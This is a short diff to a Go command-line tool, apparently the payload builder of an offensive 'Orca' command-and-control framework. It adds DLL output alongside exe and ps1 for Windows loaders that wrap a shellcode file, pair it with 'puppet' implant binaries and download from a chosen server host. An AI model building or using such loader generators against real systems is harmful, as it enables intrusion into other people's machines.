@@ -34,7 +34,7 @@ var generateCmd = &grumble.Command{
 		f.String("H", "host", "", "server host")
 		f.String("o", "output", "loader", "output filename")
 		f.String("p", "proto", "http", "download via http or https")
-		f.String("t", "type", "exe", "generate file type (exe/ps1/vbs)")
+		f.String("t", "type", "exe", "generate file type (exe/dll/ps1)")
 		f.String("P", "platform", "windows/x64", "compile platform")
 		f.String("T", "target", "", "target shellcode file")
 	},
@@ -62,7 +62,12 @@ var generateCmd = &grumble.Command{
 				return nil
 			}
 			puppetPath, _ = filepath.Abs("puppet/Orca_Puppet_win_x64.exe")
-			stubPath, _ = filepath.Abs("stub/stub_win_x64.exe")
+			if fileType == "exe" || fileType == "ps1" {
+				stubPath, _ = filepath.Abs("stub/stub_win_x64.exe")
+			}
+			if fileType == "dll" {
+				stubPath, _ = filepath.Abs("stub/stub_win_x64.dll")
+			}
 			if !fileopt.IsFile(stubPath) {
 				message := fmt.Sprintf("stub:[%s] is not exist", stubPath)
 				colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
@@ -80,7 +85,12 @@ var generateCmd = &grumble.Command{
 				return nil
 			}
 			puppetPath, _ = filepath.Abs("puppet/Orca_Puppet_win_x86.exe")
-			stubPath, _ = filepath.Abs("stub/stub_win_x86.exe")
+			if fileType == "exe" || fileType == "ps1" {
+				stubPath, _ = filepath.Abs("stub/stub_win_x86.exe")
+			}
+			if fileType == "dll" {
+				stubPath, _ = filepath.Abs("stub/stub_win_x86.dll")
+			}
 			if !fileopt.IsFile(stubPath) {
 				message := fmt.Sprintf("stub:[%s] is not exist", stubPath)
 				colorcode.PrintMessage(colorcode.SIGN_ERROR, message)
